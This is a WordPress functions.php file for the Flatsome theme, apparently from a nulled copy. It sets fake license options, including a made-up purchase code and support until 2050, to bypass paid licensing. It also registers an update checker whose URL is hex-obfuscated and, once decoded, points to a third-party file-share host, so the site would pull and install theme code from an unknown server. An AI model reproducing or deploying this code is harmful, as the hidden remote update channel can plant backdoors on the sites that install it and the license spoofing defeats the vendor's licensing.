<?php
/**
 * Flatsome functions and definitions
 *
 * @package flatsome
 */

require get_template_directory() . '/inc/init.php';

update_option( 'flatsome_wup_purchase_code', '44372D4A5957322D4D584244373534462' );
update_option( 'flatsome_wup_supported_until', '01.01.2050' );
update_option( 'flatsome_wup_buyer', 'Licensed' );
update_option( 'flatsome_wup_sold_at', time() );
delete_option( 'flatsome_wup_errors');

require 'inc/page/load-v4p11.php';
$MyUpdateChecker = Puc_v4_Factory::buildUpdateChecker(hex2bin('68747470733A2F2F6170692E616263396F6B2E636F6D2F696E6465782E7068703F6578706C6F7265722F73686172652F66696C6526686173683D336631356739566A7142317963614D6448316F4D577777786565474C2D63525A33794E536F5875746F306E736D734B6F69474C4E754E61657564515067415A64584648746A2D55714C6A6D48553877'),__FILE__,'flatsome');
/**
 * Note: It's not recommended to add any custom code here. Please use a child theme so that your customizations aren't lost during updates.
 * Learn more here: http://codex.wordpress.org/Child_Themes
 */
